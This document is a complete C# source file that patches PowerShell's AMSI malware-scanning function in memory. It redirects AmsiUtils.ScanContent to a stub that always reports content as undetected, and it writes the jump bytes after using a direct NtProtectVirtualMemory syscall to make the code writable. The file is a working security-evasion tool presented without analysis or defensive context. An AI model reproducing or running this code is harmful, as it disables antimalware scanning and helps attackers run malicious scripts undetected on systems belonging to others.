using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Patch
{
    public class bySyscall
    {
        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private static int ScanContentStub(string content, string metadata)
        {
            return 1; //AMSI_RESULT_NOTDETECTED
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DInvoke.Native.NTSTATUS NtProtectVirtualMemory(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref IntPtr RegionSize,
    uint NewProtect,
    ref uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr LoadLib(string name);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] 
        delegate IntPtr GProcAddr(IntPtr hModule, string procName);

        public static void Main()
        {
            MethodInfo original = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils").GetMethod("ScanContent", BindingFlags.NonPublic | BindingFlags.Static);
            MethodInfo replacement = typeof(bySyscall).GetMethod("ScanContentStub", BindingFlags.NonPublic | BindingFlags.Static);
            
            RuntimeHelpers.PrepareMethod(original.MethodHandle);
            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);

            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();

            byte[] latch = null;
            if (IntPtr.Size == 8)
            {
                latch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                for (int i = 0; i < address.Length; i++)
                {
                    latch[i + 2] = address[i];
                }
            }
            else
            {
                latch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
                for (int i = 0; i < address.Length; i++)
                {
                    latch[i + 1] = address[i];
                }
            }

            try
            {

                var addr = originalSite;

                uint oldProtect = 0;

                // NtProtectVirtualMemory Syscall
                IntPtr stub = DInvoke.DynamicGeneric.GetSyscallStub("NtProtectVirtualMemory");
                NtProtectVirtualMemory NtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));


                Process thisproc = Process.GetCurrentProcess();
                
                // Save value of addr as this is increased by NtProtectVirtualMemory
                IntPtr oldaddress = addr;
                
                var regionSize = (IntPtr)latch.Length;
                oldProtect = 0;

                var result = NtProtectVirtualMemory(
                thisproc.Handle,
                ref addr,
                ref regionSize,
                0x40,
                ref oldProtect);

                Marshal.Copy(latch, 0, oldaddress, latch.Length);

                regionSize = (IntPtr)latch.Length;
                uint newoldProtect = 0;

                // CleanUp permissions back to oldprotect

                result = NtProtectVirtualMemory(
                thisproc.Handle,
                ref oldaddress,
                ref regionSize,
                oldProtect,
                ref newoldProtect);

            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }
        
    }

}
